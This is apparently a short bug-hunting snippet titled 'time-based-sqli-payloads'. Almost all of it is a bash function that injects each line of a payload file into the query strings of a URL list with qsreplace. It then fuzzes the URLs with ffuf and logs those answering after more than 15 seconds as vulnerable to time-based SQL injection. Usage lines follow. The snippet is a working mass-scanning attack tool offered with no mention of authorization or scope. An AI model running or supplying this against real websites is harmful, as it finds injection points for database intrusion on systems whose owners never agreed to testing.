# time-based-sqli-payloads
1.
```
# Time Based Sql Injection
sqliTime()
{
for i in $(cat ~/.path/To/payloads) ; do
  cat $1 | qsreplace "$i" > sqli
  ffuf -u FUZZ -w sqli -s -ft "<15000" | tee -a vulnSqli.txt
  rm sqli
done
}
```
2.
```
> source .bashrc
```
3.
```
> sqliTime urls
> sqliTime urls.txt
```
